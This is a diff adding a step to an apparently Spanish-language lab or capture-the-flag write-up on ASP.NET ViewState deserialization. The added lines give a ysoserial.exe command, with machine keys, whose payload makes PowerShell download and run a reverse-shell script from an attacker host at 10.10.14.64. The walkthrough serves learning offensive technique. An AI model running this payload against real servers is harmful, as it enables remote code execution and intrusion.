@@ -51,6 +51,10 @@ cambiamos el EVENTVALIDATION= cv.pdf por = /web.config. esto nos muestra informa
 usaremos la herramienta YSoSerial.Net esta herramienta es para maquina windows asi que debes tener una maquina windows donde poder ejecutar esto (tambien puedes ejecutarlo desde kali linux pero debes complementarlo con otras herramientas)
 
 ### YSoSerial.Net
+usaremos la siguiente sintax
+```python
+C:\FilesExplotation\ysoserial-1.34\Release>.\ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.14.64/Invoke-PowerShellTcp.ps1')" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"  --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
+```
 
 ![[Pasted image 20240311110529.png]]
 
